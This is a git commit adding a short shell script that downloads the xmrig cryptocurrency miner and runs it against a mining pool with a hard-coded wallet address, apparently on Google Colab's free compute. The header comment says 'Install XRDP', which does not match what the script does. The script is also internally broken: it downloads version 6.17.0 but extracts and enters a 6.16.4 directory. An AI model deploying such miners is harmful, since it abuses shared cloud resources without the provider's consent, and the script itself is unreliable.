33e681532e52e0dfac02a64fdb737c219b5f5525
offbill <102901989+offbill@users.noreply.github.com>
2022-04-13 10:39:07 -0500

    Create gcolabRTM1-us.sh

---
+++ gcolabRTM1-us.sh
@@ -0,0 +1,13 @@
+#! /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-focal-x64.tar.gz
+tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
+cd xmrig-6.16.4
+./xmrig --donate-level 0 -a gr -o pool.minafacil.com:5555 --tls -u REEJjHmaqUjckCpbskcbgPpsrFcZiENNHD -p x
